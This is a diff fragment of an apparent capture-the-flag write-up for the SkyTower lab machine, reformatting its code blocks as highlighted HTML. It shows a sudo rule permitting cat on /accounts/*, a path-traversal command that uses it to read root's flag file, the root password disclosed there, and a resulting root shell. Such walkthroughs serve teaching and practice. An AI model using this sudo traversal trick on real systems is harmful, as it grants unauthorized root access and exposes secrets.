-    (root) NOPASSWD: /bin/cat /accounts/<em>, (root) /bin/ls /accounts/</em>
-$ sudo cat /accounts/../../root/flag.txt
-Congratz, have a cold one to celebrate!
-root password is theskytower
-$ [/plain]</p>
 
 <p>A quick su root drops us to a root shell</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ su root
-Password: theskytower
-root@SkyTower:/home/sara# id
-uid=0(root) gid=0(root) groups=0(root)
-root@SkyTower:/home/sara# [/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su root
+</span><span class='line'>Password: theskytower
+</span><span class='line'>root@SkyTower:/home/sara# id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'>root@SkyTower:/home/sara#
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p><img src="http://38.media.tumblr.com/5e829faafb14759c51d20dae54525c29/tumblr_n964zghd0h1qz581wo2_500.gif" alt="" /></p>
 </div>
